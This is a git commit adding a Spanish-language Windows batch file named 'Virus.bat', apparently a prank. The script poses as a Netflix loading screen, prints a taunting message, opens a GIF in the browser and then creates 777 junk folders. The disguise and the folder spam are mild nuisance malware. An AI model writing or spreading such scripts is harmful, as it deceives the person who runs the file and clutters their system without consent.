9c991c7506e2d2d3c2840b9be6a9b19c32e7a156
Sebastán Holweger <80050935+SHolweger@users.noreply.github.com>
2021-03-04 08:46:35 -0600

    Add files via upload

---
+++ Virus.bat
@@ -0,0 +1,21 @@
+@echo off
+title Netflix
+echo Bienvenido a Netflix 
+echo cargando...
+echo.
+pause
+cls
+pause
+echo Debiste...
+pause
+echo Apuntar...
+pause
+echo a la cabeza. 
+pause
+start https://media.tenor.com/images/ae2565eeee751aa98e95a1ca93f9566f/tenor.gif
+echo ________________________________________
+cls
+for /l %%x in (1,1,777) do (
+    mkdir "Carpeta "%%x
+     )
+pause>nul
